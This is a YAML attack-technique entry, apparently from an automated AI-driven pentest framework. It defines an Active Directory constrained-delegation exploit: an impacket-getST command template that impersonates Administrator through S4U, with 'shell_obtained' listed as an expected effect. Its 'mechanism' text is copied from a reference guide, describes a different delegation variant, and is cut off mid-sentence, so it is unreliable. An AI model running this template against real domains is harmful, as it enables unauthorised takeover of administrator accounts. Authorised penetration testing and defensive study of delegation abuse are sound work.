name: constrained_delegation
category: ad
description: Exploit constrained delegation via S4U
preconditions:
- domain_joined
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: impacket-getST '{domain}/{service_account}:{password}' -spn '{target_spn}'
  -impersonate Administrator -dc-ip {target_ip}
parser: impacket_parser
expected_effects:
- delegation_abused
- shell_obtained
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: This is similar to the basic [Constrained Delegation](constrained-delegation.md)
  but **instead** of giving permissions to an **object** to **impersonate any user
  against a machine**. Resource-based Constrain Delegation **sets** in **the object
  who is
hacktricks_ref: windows-hardening/active-directory-methodology/README.md
